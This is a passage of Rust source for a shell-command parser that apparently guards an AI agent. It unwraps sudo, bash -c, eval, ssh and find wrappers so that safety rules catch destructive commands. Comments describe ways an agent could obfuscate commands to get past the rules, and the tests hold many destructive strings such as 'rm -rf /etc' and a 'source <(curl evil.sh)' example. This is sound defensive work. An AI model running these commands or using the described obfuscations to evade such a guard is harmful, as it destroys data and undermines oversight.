                        && !target.contains("..")
                        && literal.get(1) == Some(&true) =>
                {
                    self.cwd = Some(target.to_string());
                }
                _ => {
                    self.cwd = None;
                }
            }
            return;
        }

        // Wrapper unwrap: peel layers of wrappers off until the inner
        // argv is no longer a wrapper or a body must be re-parsed.
        // `timeout 10 bash -c 'rm -rf /etc'` peels timeout → bash -c
        // → re-parse body. `sudo nice -n 5 rm -rf /etc` peels sudo →
        // nice → rm.
        let mut current_argv = argv;
        let mut current_literal = literal;
        let mut chain: Vec<Wrapper> = wrappers.to_vec();
        let mut acc_remote = remote;
        let mut acc_chrooted = chrooted;
        while let Some((wrapper, inner, r, c, body)) = unwrap_wrapper(&current_argv) {
            chain.push(wrapper);
            acc_remote = acc_remote || r;
            acc_chrooted = acc_chrooted || c;
            if let Some(body) = body {
                // Re-parse the literal `-c BODY` payload as fresh bash.
                // Body expansion happens against the CURRENT walker's
                // bindings BEFORE the inner parse — the inner Walker
                // has empty bindings.
                //
                // Body-position injection: if the body contains ANY
                // unresolvable expansion (`bash -c "echo $a"` with `a`
                // unbound, or `eval "echo $a"` ditto), the body is
                // dangerous regardless of where the expansion lands —
                // an unresolved value can introduce command separators
                // that turn the rest of the body into new commands
                // (`a='; rm -rf /'`). Per tribunal v2 (Codex finding 3),
                // emit the marker BEFORE re-parse rather than relying
                // on argv[0] alone.
                let body_to_parse = match self.expand_vars(&body) {
                    Some(expanded) => expanded,
                    None => {
                        let mut full_chain = chain.clone();
                        self.commands.push(EffectiveCommand {
                            argv: vec!["__indirect_unresolved__".to_string(), body.clone()],
                            cwd: self.cwd.clone(),
                            span: SpanKind::Executed,
                            wrappers: std::mem::take(&mut full_chain),
                            remote: acc_remote,
                            chrooted: acc_chrooted,
                            literal: Vec::new(),
                        });
                        return;
                    }
                };
                let parsed = parse_with_cwd(&body_to_parse, self.cwd.as_deref());
                if parsed.had_error {
                    self.push_shell_effect(
                        "__shell_unmodeled__",
                        None,
                        &chain,
                        acc_remote,
                        acc_chrooted,
                    );
                }
                let found = parsed.commands.len() > parsed.extra_readings;
                self.extra_readings += parsed.extra_readings;
                let inner_cmds = parsed.commands;
                if !inner_cmds.is_empty() {
                    for mut cmd in inner_cmds {
                        let mut full_chain = chain.clone();
                        full_chain.extend(cmd.wrappers);
                        cmd.wrappers = full_chain;
                        cmd.remote = cmd.remote || acc_remote;
                        cmd.chrooted = cmd.chrooted || acc_chrooted;
                        self.push_nested(cmd);
                    }
                    if found {
                        return;
                    }
                }
                // Re-parse failed completely — fall through to push the
                // wrapper command itself with the body as opaque arg.
                break;
            }
            if inner.is_empty() {
                // Wrapper had no inner command to unwrap (e.g. `sudo`
                // alone, or `ssh host` with no remote command). Stop
                // peeling; record the wrapper itself.
                return;
            }
            // See push_reading: a wrapper may re-evaluate the words.
            current_literal.clear();
            current_argv = inner;
        }

        if current_argv.first().is_some_and(|head| {
            matches!(
                head.rsplit('/').next().unwrap_or(head),
                "bash" | "sh" | "zsh" | "ksh" | "dash"
            )
        }) {
            self.push_shell_effect(
                "__shell_unmodeled__",
                None,
                &chain,
                acc_remote,
                acc_chrooted,
            );
        }
        self.commands.push(EffectiveCommand {
            argv: current_argv,
            cwd: self.cwd.clone(),
            span: SpanKind::Executed,
            wrappers: chain,
            remote: acc_remote,
            chrooted: acc_chrooted,
            literal: current_literal,
        });
    }
}

/// Decode token forms bash evaluates at parse time, so a rule
/// matching the literal string `"rm"` still fires on `$'rm'` and
/// `\r\m`. Without this an agent could obfuscate the head past the
/// rules layer:
///   `$'rm' -rf /`     →  `rm` (ANSI-C string is bash-literal)
///   `\r\m -rf /`      →  `rm` (escapes are bash-literal in unquoted text)
///   `\$EDITOR foo`    →  `\$EDITOR` is NOT decoded — the leading
///                        `\$` keeps `$` literal in bash too.
/// This is NOT indirection (no agent-controlled state involved); the
/// rules layer only knows literal strings, so we normalize before
/// rule application. Per tribunal v2 (Codex finding 6, Gemini finding 2).
fn decode_token(text: &str) -> String {
    // ANSI-C string `$'X'`: bash evaluates escape sequences inside.
    // We handle the common escape-free case (no \-sequences inside)
    // by stripping the wrapper. Sequences like `\n`, `\x41` are
    // outside scope — leave the wrapper if they're present, the
    // envelope's contains_var_ref will still see the leading `$`
    // and route via the indirect-unresolved marker.
    if let Some(inner) = text.strip_prefix("$'").and_then(|s| s.strip_suffix('\'')) {
        if !inner.contains('\\') {
            return inner.to_string();
        }
    }
    // Unquoted backslash escapes: `\X` → `X` for any `X`. Real bash
    // also drops the backslash for non-special characters; for the
    // rules layer the destination is the same. Don't touch tokens
    // that are quoted strings (handled by `unquote` separately).
    if !text.starts_with('"') && !text.starts_with('\'') && text.contains('\\') {
        let mut out = String::with_capacity(text.len());
        let mut chars = text.chars().peekable();
        while let Some(c) = chars.next() {
            if c == '\\' {
                if let Some(&next) = chars.peek() {
                    out.push(next);
                    chars.next();
                    continue;
                }
            }
            out.push(c);
        }
        return out;
    }
    text.to_string()
}

/// Strip outer quoting layer that tree-sitter retains in the source
/// text. Single-quoted strings are returned literally; double-quoted
/// strings have surrounding quotes removed but interior content is left
/// as-is (variables stay literal markers, not expanded).
fn unquote(text: &str) -> String {
    let bytes = text.as_bytes();
    if bytes.len() >= 2 {
        let first = bytes[0];
        let last = bytes[bytes.len() - 1];
        if (first == b'"' && last == b'"') || (first == b'\'' && last == b'\'') {
            return text[1..text.len() - 1].to_string();
        }
    }
    text.to_string()
}

/// Strip outer quoting from a `&str` without copying. Used by the
/// pipe-to-shell re-parse where we need to feed a quoted body back to
/// `parse()`.
fn strip_outer_quotes(text: &str) -> &str {
    let bytes = text.as_bytes();
    if bytes.len() >= 2 {
        let first = bytes[0];
        let last = bytes[bytes.len() - 1];
        if (first == b'"' && last == b'"') || (first == b'\'' && last == b'\'') {
            return &text[1..text.len() - 1];
        }
    }
    text
}

/// Best-effort check that a token is a literal string (not a variable
/// or expansion). Tree-sitter has already separated `string`/`raw_string`
/// nodes from `simple_expansion`/`expansion`; here we just check that
/// the text doesn't start with `$` or `\`` after any opening quote.
fn looks_like_literal(token: &str) -> bool {
    let bare = strip_outer_quotes(token);
    !bare.starts_with('$') && !bare.starts_with('`')
}

/// Inspect an `argv` and detect whether its head is a wrapper. Returns
/// the unwrap result: (wrapper kind, inner argv, remote-after-unwrap,
/// chroot-after-unwrap, optional body to re-parse as bash).
///
/// For wrappers like `bash -c "BODY"` the inner argv is empty and the
/// body is returned for re-parsing. For `sudo rm -rf /etc` the inner
/// argv is `["rm", "-rf", "/etc"]` and no re-parse is needed.
#[allow(clippy::type_complexity)]
fn unwrap_wrapper(argv: &[String]) -> Option<(Wrapper, Vec<String>, bool, bool, Option<String>)> {
    let head = argv.first()?.as_str();

    /// Skip flags consuming flag-value pairs for known argful flags.
    /// `--name=val` long-form is dropped without a peek. Stops at the
    /// first non-flag token (or `--` separator). Returns the index of
    /// the first positional token.
    fn skip_flags_with_arity(rest: &[String], argful: &[&str]) -> usize {
        let mut i = 0;
        while i < rest.len() {
            let t = rest[i].as_str();
            if t == "--" {
                return i + 1;
            }
            if !t.starts_with('-') {
                return i;
            }
            if t.contains('=') {
                i += 1;
                continue;
            }
            if argful.contains(&t) && i + 1 < rest.len() {
                i += 2;
            } else {
                i += 1;
            }
        }
        i
    }

    match head {
        "sudo" | "doas" => {
            // sudo argful flags per manpage: -u (user), -g (group),
            // -A (askpass program), -h (host), -p (prompt), -C (close
            // fd), -D (chdir), -r (role), -t (type), -T (timeout),
            // -U (other user), -e/--edit takes file list. Stops at
            // first positional → that's the inner command name.
            const SUDO_ARGFUL: &[&str] = &[
                "-u",
                "--user",
                "-g",
                "--group",
                "-A",
                "--askpass",
                "-h",
                "--host",
                "-p",
                "--prompt",
                "-C",
                "--close-from",
                "-D",
                "--chdir",
                "-r",
                "--role",
                "-t",
                "--type",
                "-T",
                "--command-timeout",
                "-U",
                "--other-user",
            ];
            let rest = &argv[1..];
            let skip = skip_flags_with_arity(rest, SUDO_ARGFUL);
            let inner = rest[skip..].to_vec();
            Some((wrapper_for_head(head), inner, false, false, None))
        }
        "env" | "command" | "builtin" | "exec" => {
            // `env [-i] [-u VAR] [-C dir] [-S string] [VAR=val ...] cmd
            //  args...` — assignments are tokens of form `NAME=value`.
            // Argful flags consume the next token; `--name=val` is
            // self-contained.
            const ENV_ARGFUL: &[&str] = &[
                "-u",
                "--unset",
                "-C",
                "--chdir",
                "-S",
                "--split-string",
                "--block-signal",
                "--default-signal",
                "--ignore-signal",
            ];
            let rest = &argv[1..];
            let mut idx = 0;
            while idx < rest.len() {
                let t = &rest[idx];
                if is_var_assign(t) {
                    idx += 1;
                    continue;
                }
                if t == "--" {
                    idx += 1;
                    break;
                }
                if !t.starts_with('-') {
                    break;
                }
                if t.contains('=') {
                    idx += 1;
                    continue;
                }
                if ENV_ARGFUL.contains(&t.as_str()) && idx + 1 < rest.len() {
                    idx += 2;
                } else {
                    idx += 1;
                }
            }
            let inner = rest[idx..].to_vec();
            Some((wrapper_for_head(head), inner, false, false, None))
        }
        "bash" | "sh" | "zsh" | "ksh" | "dash" => {
            // Look for `-c BODY`. If present, body is re-parsed.
            let mut iter = argv[1..].iter().peekable();
            while let Some(t) = iter.next() {
                if t == "-c" {
                    if let Some(body) = iter.next() {
                        return Some((
                            wrapper_for_head(head),
                            Vec::new(),
                            false,
                            false,
                            Some(body.clone()),
                        ));
                    }
                }
                if let Some(body) = t.strip_prefix("-c") {
                    if !body.is_empty() && !body.starts_with('-') {
                        return Some((
                            wrapper_for_head(head),
                            Vec::new(),
                            false,
                            false,
                            Some(body.to_string()),
                        ));
                    }
                }
            }
            None
        }
        "eval" => {
            // `eval "BODY"` re-parses BODY. The body might be literal
            // (`eval "rm -rf /etc"`) or contain expansion (`eval "$X"`).
            // We push the body up to handle_command which routes it
            // through the unified bindings path: expand_vars resolves
            // when possible, otherwise the envelope emits the unresolved
            // marker. This keeps eval and `bash -c` consistent — the
            // old standalone `__eval_dynamic__` emitter diverged from
            // the rest of the codebase whenever a binding existed.
            if argv.len() < 2 {
                return None;
            }
            let body = argv[1..].join(" ");
            Some((Wrapper::Shell, Vec::new(), false, false, Some(body)))
        }
        "source" | "." => {
            // `source FILE` and `. FILE` execute FILE in the current
            // shell. We can't read the file contents at parse time
            // (it might not even exist yet), so any source operation
            // is opaque execution. Emit the indirect-unresolved marker
            // so a rule fires. Conservative-ask matches the threat
            // model: `source <(curl evil.sh)` should not be classified
            // safe, and even literal-path `source ./scripts/foo.sh`
            // could execute arbitrary commands the agent didn't show.
            if argv.len() < 2 {
                return None;
            }
            let target = argv[1..].join(" ");
            // Use Shell wrapper category — same as eval/bash -c.
            // The body is the source target; the head of the inner
            // command will be `__indirect_unresolved__` because the
            // body is not a literal command but a source argument.
            Some((
                Wrapper::Shell,
                vec![
                    "__indirect_unresolved__".to_string(),
                    format!("source {target}"),
                ],
                false,
                false,
                None,
            ))
        }
        "timeout" | "nohup" | "time" | "nice" | "ionice" | "setsid" | "flock" => {
            // Per-wrapper argful flag tables. Stops at first positional;
            // for timeout/nice/ionice the FIRST positional is the
            // duration/niceness value (which we then drop from the
            // inner command).
            const TIMEOUT_ARGFUL: &[&str] = &["-k", "--kill-after", "-s", "--signal"];
            const NICE_ARGFUL: &[&str] = &["-n", "--adjustment"];
            const IONICE_ARGFUL: &[&str] = &["-c", "-n", "-p", "-P", "-u"];
            const FLOCK_ARGFUL: &[&str] = &["-c", "-E", "-w", "--timeout"];
            let argful: &[&str] = match head {
                "timeout" => TIMEOUT_ARGFUL,
                "nice" => NICE_ARGFUL,
                "ionice" => IONICE_ARGFUL,
                "flock" => FLOCK_ARGFUL,
                _ => &[],
            };
            let rest = &argv[1..];
            let skip = skip_flags_with_arity(rest, argful);
            let after_flags = &rest[skip..];
            // timeout takes a duration arg: `timeout 5 cmd`.
            // nice without -n: `nice cmd` (default niceness, no extra).
            // ionice without -c/-n: `ionice cmd` (no extra).
            let consume_one_positional = head == "timeout" && !after_flags.is_empty();
            let extra = if consume_one_positional { 1 } else { 0 };
            let inner = after_flags[extra..].to_vec();
            Some((wrapper_for_head(head), inner, false, false, None))
        }
        "ssh" => {
            // `ssh [-flags] [user@]host cmd [args...]`. Per `man ssh`,
            // these flags consume a value token: -B, -b, -c, -D, -E,
            // -e, -F, -I, -i, -J, -L, -l, -m, -O, -o, -p, -P, -Q, -R,
            // -S, -W, -w. Without consuming the value the host position
            // shifts and the inner command gets misidentified.
            const SSH_ARGFUL: &[&str] = &[
                "-B", "-b", "-c", "-D", "-E", "-e", "-F", "-I", "-i", "-J", "-L", "-l", "-m", "-O",
                "-o", "-p", "-P", "-Q", "-R", "-S", "-W", "-w",
            ];
            let rest = &argv[1..];
            let host_idx = skip_flags_with_arity(rest, SSH_ARGFUL);
            let cmd_start = host_idx + 1; // skip the host token
            if cmd_start >= rest.len() {
                return Some((Wrapper::Ssh, Vec::new(), true, false, None));
            }
            // Remaining is the remote command. If it's a single quoted
            // string, re-parse it; otherwise it's an already-tokenised
            // argv.
            if rest.len() - cmd_start == 1 && rest[cmd_start].contains(' ') {
                return Some((
                    Wrapper::Ssh,
                    Vec::new(),
                    true,
                    false,
                    Some(rest[cmd_start].clone()),
                ));
            }
            Some((Wrapper::Ssh, rest[cmd_start..].to_vec(), true, false, None))
        }
        "chroot" => {
            // `chroot [opts] DIR cmd args...`. chroot's only argful
            // flags are `--userspec=USER:GROUP` and `--groups=...`,
            // both `--name=val` form (no value-token-consumption).
            let rest = &argv[1..];
            if rest.is_empty() {
                return Some((Wrapper::Chroot, Vec::new(), false, true, None));
            }
            let dir_idx = skip_flags_with_arity(rest, &[]);
            let after = &rest[dir_idx..];
            if after.is_empty() {
                return Some((Wrapper::Chroot, Vec::new(), false, true, None));
            }
            let inner = if after.len() >= 2 {
                after[1..].to_vec()
            } else {
                Vec::new()
            };
            Some((Wrapper::Chroot, inner, false, true, None))
        }
        "xargs" | "parallel" | "watch" => {
            // xargs argful flags: `-I {}`, `-n N`, `-P N`, `-L N`,
            // `-d sep`, `-E EOF`, `-s SIZE`, `-a FILE`, `--max-args`,
            // `--max-procs`, `--max-chars`, `--max-lines`, etc.
            const XARGS_ARGFUL: &[&str] = &[
                "-I",
                "-i",
                "-n",
                "--max-args",
                "-P",
                "--max-procs",
                "-L",
                "--max-lines",
                "-d",
                "--delimiter",
                "-E",
                "-s",
                "--max-chars",
                "-a",
                "--arg-file",
                "--replace",
            ];
            let rest = &argv[1..];
            let idx = skip_flags_with_arity(rest, XARGS_ARGFUL);
            let inner = rest[idx..].to_vec();
            Some((wrapper_for_head(head), inner, false, false, None))
        }
        "find" => {
            // `find PATHS [opts] -delete` synthesises a virtual `rm`.
            // `find PATHS -exec CMD {} \;` synthesises a CMD command.
            let rest = &argv[1..];
            if rest.iter().any(|t| t == "-delete") {
                let mut synth = vec!["rm".to_string(), "-rf".to_string()];
                for t in rest.iter() {
                    if !t.starts_with('-') {
                        synth.push(t.clone());
                        break;
                    }
                }
                return Some((Wrapper::Find, synth, false, false, None));
            }
            if let Some(pos) = rest.iter().position(|t| t == "-exec" || t == "-execdir") {
                let after = &rest[pos + 1..];
                let cmd_end = after
                    .iter()
                    .position(|t| t == ";" || t == "\\;" || t == "+");
                let inner = match cmd_end {
                    Some(end) => after[..end].to_vec(),
                    None => after.to_vec(),
                };
                let cleaned: Vec<String> = inner
                    .into_iter()
                    .filter(|t| t != "{}" && !t.is_empty())
                    .collect();
                if !cleaned.is_empty() {
                    return Some((Wrapper::Find, cleaned, false, false, None));
                }
            }
            None
        }
        "busybox" => {
            // `busybox CMD args...` — drop the head and let the inner
            // command's classifier run.
            if argv.len() >= 2 {
                Some((Wrapper::PassThrough, argv[1..].to_vec(), false, false, None))
            } else {
                None
            }
        }
        _ => None,
    }
}

fn wrapper_for_head(head: &str) -> Wrapper {
    match head {
        "sudo" | "doas" => Wrapper::Sudo,
        "bash" | "sh" | "zsh" | "ksh" | "dash" => Wrapper::Shell,
        "eval" => Wrapper::Shell,
        "xargs" | "parallel" | "watch" => Wrapper::StdinArgs,
        "ssh" => Wrapper::Ssh,
        "chroot" => Wrapper::Chroot,
        // env, command, builtin, exec, timeout, nohup, time, nice,
        // ionice, setsid, flock, busybox — pass-through wrappers that
        // don't change the inner command's classification semantics.
        _ => Wrapper::PassThrough,
    }
}

/// Envelope check: does `s` contain any execution-position indirection
/// — variable expansion (`$X`, `${X}`), command substitution (`$(X)`),
/// backtick (`` `X` ``), or any positional/special parameter (`$1`,
/// `$@`, `$*`, `$?`, `$$`, `$#`, `$!`, `$-`)? Used to gate the
/// indirect-command branch in `handle_command`.
///
/// Per decision.guard-indirection-hardening: any unresolvable indirection
/// in execution position is destructive. The gate must fire on
/// indirection ANYWHERE in argv[0] (not just at the start) to catch
/// prefix-concat patterns (`r$a`, `pre${b}post`), command-sub heads
/// (`$(echo rm)`), and backtick heads (`` `cmd` ``). The actual
/// resolve-or-flag decision is in `expand_vars`.
fn contains_var_ref(s: &str) -> bool {
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '`' {
            return true;
        }
        if c == '$' {
            match chars.peek() {
                Some(&c2) => {
                    if c2 == '_'
                        || c2 == '{'
                        || c2 == '('
                        || c2.is_ascii_alphanumeric()
                        || matches!(c2, '@' | '*' | '?' | '#' | '$' | '!' | '-')
                    {
                        return true;
                    }
                }
                None => return false,
            }
        }
    }
    false
}

/// Parse a `variable_assignment` node's source text into (name, value).
/// Tree-sitter delivers the raw text including any surrounding quotes
/// on the RHS; we strip outer quotes so the bound value matches what
/// the shell would expose. Returns None on shapes we cannot statically
/// resolve to a fixed literal payload:
///
///   * Array literals: `a=(...)` — array semantics differ from scalar.
///   * Append/concat: `a+=...` — the `+` lands inside the name slice,
///     fails the name-charset check.
///   * Dynamic RHS at any depth: `a=$(cmd)`, `a=$b`, `a="$(cmd)"`,
///     `a="prefix$(cmd)"`, `` a=`cmd` ``, `a="$X-y"`. Without this
///     refusal an embedded substitution would be unquoted into the
///     bound value and treated as literal text on later use, which
///     is the verified bypass class `a="$(echo rm) -rf /"; $a`.
///   * Backslash escapes: `a=rm\ -rf\ /`. We do not model word-removal
///     of escapes, so binding the raw text would either leak the
///     backslashes through into re-parse (changing semantics) or
///     silently drop them (also changing semantics). Refuse.
///
/// On refusal the variable stays unbound; later `$a` use surfaces
/// through the envelope as `__indirect_unresolved__` — which is
/// exactly the conservative-ask behaviour we want for opaque values.
fn parse_assignment(text: &str) -> Option<(String, String)> {
    let eq = text.find('=')?;
    if eq == 0 {
        return None;
    }
    let name = &text[..eq];
    if !name
        .chars()
        .next()
        .is_some_and(|c| c == '_' || c.is_ascii_alphabetic())
        || !name.chars().all(|c| c == '_' || c.is_ascii_alphanumeric())
    {
        return None;
    }
    let raw = &text[eq + 1..];
    if raw.starts_with('(') {
        return None;
    }
    // Anywhere in the RAW text — quoted or not — refuse if the value
    // would inherit dynamic semantics. `"$(...)"` starts with `"` so
    // the old first-byte check on `$` missed it; scan everywhere.
    if raw.contains("$(") || raw.contains("${") || raw.contains('`') || raw.contains('\\') {
        return None;
    }
    // Plain `$NAME` form (`a=$b`). Already covered if it's the first
    // byte, but cover the quoted case too: `a="$b"`.
    if raw.starts_with('$') || raw.contains("\"$") || raw.contains("'$") {
        return None;
    }
    Some((name.to_string(), unquote(raw)))
}

/// Conservative shell variable name check: `[A-Za-z_][A-Za-z0-9_]*`.
fn is_valid_var_name(s: &str) -> bool {
    let mut chars = s.chars();
    let Some(first) = chars.next() else {
        return false;
    };
    if !(first == '_' || first.is_ascii_alphabetic()) {
        return false;
    }
    chars.all(|c| c == '_' || c.is_ascii_alphanumeric())
}

/// Extract just the variable name from a `NAME=...` text (used when
/// `parse_assignment` refuses the value but we still want to record
/// that the name was assigned — see the tainted-env-shadow path).
fn static_assignment_name(text: &str) -> Option<(String, ())> {
    let eq = text.find('=')?;
    if eq == 0 {
        return None;
    }
    let name = &text[..eq];
    if !name
        .chars()
        .next()
        .is_some_and(|c| c == '_' || c.is_ascii_alphabetic())
        || !name.chars().all(|c| c == '_' || c.is_ascii_alphanumeric())
    {
        return None;
    }
    Some((name.to_string(), ()))
}

fn is_var_assign(token: &str) -> bool {
    if let Some(eq) = token.find('=') {
        if eq == 0 {
            return false;
        }
        let lhs = &token[..eq];
        return lhs.chars().all(|c| c == '_' || c.is_ascii_alphanumeric())
            && lhs.chars().next().is_some_and(|c| !c.is_ascii_digit());
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Every nested re-parse carries its extra readings up, including the
    /// `echo ... | bash` path, so no enclosing fallback counts them.
    #[test]
    fn nested_reparses_report_their_extra_readings() {
        for src in [
            "echo \"'r'm -rf /tmp/x\" | bash",
            "bash <<< \"'r'm -rf /tmp/x\"",
            "bash -c \"'r'm -rf /tmp/x\"",
        ] {
            let parsed = parse(src);
            assert!(parsed.extra_readings >= 1, "{src}");
            assert!(parsed.commands.len() > parsed.extra_readings, "{src}");
        }
    }

    fn cmds(src: &str) -> Vec<EffectiveCommand> {
        parse(src).commands
    }

    #[test]
    fn plain_command() {
        let c = cmds("ls -la");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["ls", "-la"]);
        assert!(c[0].wrappers.is_empty());
    }

    #[test]
    fn sudo_unwraps() {
        let c = cmds("sudo rm -rf /etc");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
        assert_eq!(c[0].wrappers, vec![Wrapper::Sudo]);
    }

    #[test]
    fn env_assignments_skipped() {
        let c = cmds("env FOO=1 BAR=2 rm -rf /etc");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
    }

    #[test]
    fn bash_c_reparses_body() {
        let c = cmds("bash -c 'rm -rf /etc/nginx'");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc/nginx"]);
        assert!(c[0].wrappers.contains(&Wrapper::Shell));
    }

    #[test]
    fn eval_literal_reparses() {
        let c = cmds("eval \"rm -rf /etc\"");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
        assert!(c[0].wrappers.contains(&Wrapper::Shell));
    }

    #[test]
    fn timeout_skips_duration() {
        let c = cmds("timeout 10 bash -c 'rm -rf /etc'");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
        let w = &c[0].wrappers;
        assert!(w.contains(&Wrapper::PassThrough)); // timeout → PassThrough
        assert!(w.contains(&Wrapper::Shell));
    }

    #[test]
    fn find_delete_synth() {
        let c = cmds("find /var/log -name '*.log' -delete");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv[0], "rm");
        assert!(c[0].wrappers.contains(&Wrapper::Find));
    }

    #[test]
    fn ssh_marks_remote() {
        let c = cmds("ssh prod 'rm -rf /var'");
        assert_eq!(c.len(), 1);
        assert!(c[0].remote);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/var"]);
    }

    #[test]
    fn chroot_marks_chrooted() {
        let c = cmds("chroot /mnt rm -rf /etc");
        assert_eq!(c.len(), 1);
        assert!(c[0].chrooted);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
    }

    /// A word is literal only when argv holds what the shell passes.
    #[test]
    fn literal_flags_follow_the_shell() {
        let flags = |src: &str| {
            let c = cmds(src);
            (c[0].argv.clone(), c[0].literal.clone())
        };
        assert_eq!(flags("sed -i 's/a*/b/' f.txt").1, vec![true; 4]);
        assert_eq!(flags("cp a *.txt").1, vec![true, true, false]);
        assert_eq!(flags("cp a \"$X\"").1, vec![true, true, false]);
        assert_eq!(flags("cp a \"b c\"").1, vec![true, true, true]);
        // An escaped glob character is literal; `=x` and `~/y` expand.
        assert_eq!(
            flags("cp a =x ~/y b\\*").1,
            vec![true, true, false, false, true]
        );
        // A backslash inside double quotes is not decoded by argv; zsh
        // expands `$~X` inside double quotes.
        assert_eq!(flags("cp a \"b\\\"c\"").1, vec![true, true, false]);
        assert_eq!(flags("touch \"$~X\"").1, vec![true, false]);
        // argv keeps the glued quote marks; the decoded reading holds the word.
        let glued = cmds("cp a 'policy dir'/x");
        let literal_of = |word: &str| {
            glued
                .iter()
                .find(|cmd| cmd.argv.last().map(String::as_str) == Some(word))
                .map(|cmd| cmd.literal.clone())
        };
        assert_eq!(literal_of("'policy dir'/x"), Some(vec![true, true, false]));
        assert_eq!(literal_of("policy dir/x"), Some(vec![true, true, true]));
        // A wrapper may substitute or re-evaluate words (xargs -I, watch,
        // ssh, sudo -s), so a peeled command keeps no flags.
        let (argv, literal) = flags("sudo -u root cp a 'b*'");
        assert_eq!(argv, vec!["cp", "a", "b*"]);
        assert!(literal.is_empty());
        // A quoted program name keeps its quote marks in argv.
        let quoted = cmds("'export' A=1");
        let argv_form = quoted.iter().find(|cmd| cmd.argv[0] == "'export'").unwrap();
        assert_eq!(argv_form.literal, vec![false, true]);
        // The re-parse of an expanded program name does not split or glob.
        let c = cmds("X='cp a b'; $X");
        assert!(c.iter().all(|cmd| cmd.literal.is_empty()), "{c:?}");
    }

    #[test]
    fn cd_then_rm_carries_cwd() {
        let c = cmds("cd /tmp && rm -rf ci-results");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "ci-results"]);
        assert_eq!(c[0].cwd.as_deref(), Some("/tmp"));
    }

    #[test]
    fn subshell_isolates_cwd() {
        let c = cmds("(cd /tmp && rm -rf x); rm -rf y");
        // First command (rm in subshell) has cwd=/tmp; second (top-
        // level rm after subshell) inherits None.
        assert_eq!(c.len(), 2);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "x"]);
        assert_eq!(c[0].cwd.as_deref(), Some("/tmp"));
        assert_eq!(c[1].argv, vec!["rm", "-rf", "y"]);
        assert!(c[1].cwd.is_none());
    }

    #[test]
    fn heredoc_body_not_executed() {
        // `cat <<EOF\nrm -rf /\nEOF` — the body is data, only `cat`
        // is an executed command. tree-sitter knows this; our walker
        // skips heredoc_redirect / heredoc_body content.
        let c = cmds("cat <<EOF\nrm -rf /\nEOF");
        assert!(c.iter().any(|cmd| cmd.argv[0] == "cat"));
        assert!(c.iter().all(|cmd| cmd.argv[0] != "rm"));
    }

    #[test]
    fn quoted_string_is_data() {
        // `git commit -m "rm -rf detection"` — the message is data.
        // Tree-sitter keeps it as a single string node; argv has 4
        // elements but the third is a literal message, not an rm
        // execution.
        let c = cmds("git commit -m \"rm -rf detection\"");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv[0], "git");
        assert!(c[0].argv.iter().all(|a| a != "rm"));
    }

    #[test]
    fn pipeline_keeps_each_stage() {
        let c = cmds("echo 'rm -rf /' | bash");
        // Both stages should appear as separate commands. The `bash`
        // stage has no -c so we don't re-parse the upstream literal
        // — that's a follow-up step.
        assert!(c.iter().any(|cmd| cmd.argv[0] == "echo"));
        assert!(c.iter().any(|cmd| cmd.argv[0] == "bash"));
    }

    // ── tribunal-355 fixes ──────────────────────────────────────────

    #[test]
    fn command_substitution_in_arg_is_walked() {
        // `echo $(rm -rf /etc)` — the inner rm runs first and must
        // surface as its own EffectiveCommand. Verified bypass.
        let c = cmds("echo $(rm -rf /etc)");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/etc"]),
            "rm not found in: {c:#?}"
        );
    }

    #[test]
    fn command_substitution_inside_string_is_walked() {
        // `echo "$(rm -rf /etc)"` — substitution is nested inside a
        // double-quoted string. Walker must descend into string
        // children to find the inner command.
        let c = cmds("echo \"$(rm -rf /etc)\"");
        assert!(
            c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/etc"]),
            "rm not found in: {c:#?}"
        );
    }

    #[test]
    fn sudo_with_user_flag_unwraps_correctly() {
        // `sudo -u root rm -rf /etc` — argful `-u` flag must consume
        // its value before the inner command starts. Old impl let
        // `root` slip into command position.
        let c = cmds("sudo -u root rm -rf /etc");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
    }

    #[test]
    fn env_with_unset_flag_unwraps_correctly() {
        let c = cmds("env -u FOO rm -rf /etc");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
    }

    #[test]
    fn timeout_with_kill_after_flag_unwraps_correctly() {
        let c = cmds("timeout -k 1 5 rm -rf /etc");
        assert_eq!(c.len(), 1);
        assert_eq!(c[0].argv, vec!["rm", "-rf", "/etc"]);
    }

    #[test]
    fn ssh_with_control_socket_unwraps_correctly() {
        // `ssh -S ctl prod 'rm -rf /etc'` — `-S` consumes the next
        // token as the control-socket path; without that, `prod`
        // becomes the host and the command is misread.
        let c = cmds("ssh -S ctl prod 'rm -rf /etc'");
        assert!(c.iter().any(|cmd| cmd.argv == vec!["rm", "-rf", "/etc"]));
    }

    #[test]
    fn relative_cd_drops_cwd() {
        // `cd /tmp && cd .. && rm -rf var` — after the relative cd
        // we cannot resolve cwd; must drop to None so rm sees no
        // cwd context and `var` is not implicitly /tmp/var.
        let c = cmds("cd /tmp && cd .. && rm -rf var");
        let rm = c.iter().find(|cmd| cmd.argv[0] == "rm").expect("rm");
        assert_eq!(rm.cwd, None);
    }

    #[test]
    fn cd_to_subdir_drops_cwd() {
        let c = cmds("cd /tmp && cd subdir && rm -rf x");
        let rm = c.iter().find(|cmd| cmd.argv[0] == "rm").expect("rm");
        assert_eq!(rm.cwd, None);
    }

    #[test]
    fn eval_dynamic_emits_marker() {
        // `eval "$X"` — dynamic body, X unbound. After unifying eval
        // with the bindings path (decision.guard-indirection-hardening),
        // eval no longer emits a separate `__eval_dynamic__` marker;
